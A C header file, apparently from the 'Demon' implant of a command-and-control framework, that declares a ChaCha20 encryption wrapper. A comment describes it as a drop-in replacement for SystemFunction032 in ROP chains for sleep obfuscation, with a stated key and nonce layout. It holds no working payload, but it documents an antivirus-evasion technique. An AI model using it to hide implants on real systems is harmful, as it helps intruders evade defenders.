#ifndef DEMON_CHACHA20CRYPT_H
#define DEMON_CHACHA20CRYPT_H

#include <windows.h>
#include <ntstatus.h>
#include <core/SleepObf.h>

/* USTRING wrapper for ROP chains (drop-in replacement for SystemFunction032).
 * Key->Buffer must be 44 bytes: first 32 = key, last 12 = nonce. Counter starts at 0.
 * ChaCha20Crypt() is static inline inside ChaCha20Crypt.c - not exported. */
NTSTATUS WINAPI ChaCha20CryptUString( USTRING* Data, USTRING* Key );

#endif
